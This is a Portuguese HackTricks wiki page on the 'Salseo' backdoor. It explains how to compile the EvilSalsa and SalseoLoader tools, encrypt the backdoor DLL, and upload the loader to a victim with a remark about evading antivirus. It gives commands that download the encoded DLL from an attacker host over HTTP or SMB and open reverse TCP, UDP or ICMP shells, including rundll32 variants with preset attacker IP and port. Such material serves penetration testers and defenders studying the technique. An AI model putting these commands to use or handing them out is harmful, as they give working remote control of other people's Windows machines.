# Salseo

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** 💬 [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.

</details>
{% endhint %}

## Compilando os binários

Baixe o código-fonte do github e compile **EvilSalsa** e **SalseoLoader**. Você precisará do **Visual Studio** instalado para compilar o código.

Compile esses projetos para a arquitetura da máquina Windows onde você vai usá-los (Se o Windows suportar x64, compile-os para essa arquitetura).

Você pode **selecionar a arquitetura** dentro do Visual Studio na **aba "Build" à esquerda** em **"Platform Target".**

(\*\*Se você não conseguir encontrar essas opções, clique na **"Project Tab"** e depois em **"\<Project Name> Properties"**)

![](<../.gitbook/assets/image (839).png>)

Então, construa ambos os projetos (Build -> Build Solution) (Dentro dos logs aparecerá o caminho do executável):

![](<../.gitbook/assets/image (381).png>)

## Prepare o Backdoor

Primeiro de tudo, você precisará codificar o **EvilSalsa.dll.** Para isso, você pode usar o script python **encrypterassembly.py** ou pode compilar o projeto **EncrypterAssembly**:

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### Windows
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
Ok, agora você tem tudo o que precisa para executar toda a coisa do Salseo: o **EvilDalsa.dll codificado** e o **binário do SalseoLoader.**

**Faça o upload do binário SalseoLoader.exe para a máquina. Eles não devem ser detectados por nenhum AV...**

## **Executar o backdoor**

### **Obtendo um shell reverso TCP (baixando dll codificada através de HTTP)**

Lembre-se de iniciar um nc como o ouvinte do shell reverso e um servidor HTTP para servir o evilsalsa codificado.
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **Obtendo um shell reverso UDP (baixando dll codificada através do SMB)**

Lembre-se de iniciar um nc como o ouvinte do shell reverso e um servidor SMB para servir o evilsalsa codificado (impacket-smbserver).
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **Obtendo um shell reverso ICMP (dll codificada já dentro da vítima)**

**Desta vez você precisa de uma ferramenta especial no cliente para receber o shell reverso. Baixe:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **Desativar Respostas ICMP:**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### Execute o cliente:
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### Dentro da vítima, vamos executar a coisa do salseo:
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## Compilando SalseoLoader como DLL exportando a função principal

Abra o projeto SalseoLoader usando o Visual Studio.

### Adicione antes da função principal: \[DllExport]

![](<../.gitbook/assets/image (409).png>)

### Instale DllExport para este projeto

#### **Ferramentas** --> **Gerenciador de Pacotes NuGet** --> **Gerenciar Pacotes NuGet para a Solução...**

![](<../.gitbook/assets/image (881).png>)

#### **Pesquise pelo pacote DllExport (usando a aba Navegar) e pressione Instalar (e aceite o popup)**

![](<../.gitbook/assets/image (100).png>)

Na sua pasta do projeto, apareceram os arquivos: **DllExport.bat** e **DllExport\_Configure.bat**

### **Des**instalar DllExport

Pressione **Desinstalar** (sim, é estranho, mas confie em mim, é necessário)

![](<../.gitbook/assets/image (97).png>)

### **Saia do Visual Studio e execute DllExport\_configure**

Apenas **saia** do Visual Studio

Em seguida, vá para sua **pasta SalseoLoader** e **execute DllExport\_Configure.bat**

Selecione **x64** (se você for usá-lo dentro de uma caixa x64, esse foi o meu caso), selecione **System.Runtime.InteropServices** (dentro de **Namespace para DllExport**) e pressione **Aplicar**

![](<../.gitbook/assets/image (882).png>)

### **Abra o projeto novamente com o Visual Studio**

**\[DllExport]** não deve mais estar marcado como erro

![](<../.gitbook/assets/image (670).png>)

### Compile a solução

Selecione **Tipo de Saída = Biblioteca de Classes** (Projeto --> Propriedades do SalseoLoader --> Aplicativo --> Tipo de saída = Biblioteca de Classes)

![](<../.gitbook/assets/image (847).png>)

Selecione **plataforma x64** (Projeto --> Propriedades do SalseoLoader --> Compilar --> Destino da plataforma = x64)

![](<../.gitbook/assets/image (285).png>)

Para **compilar** a solução: Compilar --> Compilar Solução (Dentro do console de Saída, o caminho da nova DLL aparecerá)

### Teste a Dll gerada

Copie e cole a Dll onde você deseja testá-la.

Execute:
```
rundll32.exe SalseoLoader.dll,main
```
Se nenhum erro aparecer, provavelmente você tem um DLL funcional!!

## Obter um shell usando o DLL

Não se esqueça de usar um **servidor** **HTTP** e configurar um **listener** **nc**

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Suporte ao HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** 💬 [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.

</details>
{% endhint %}
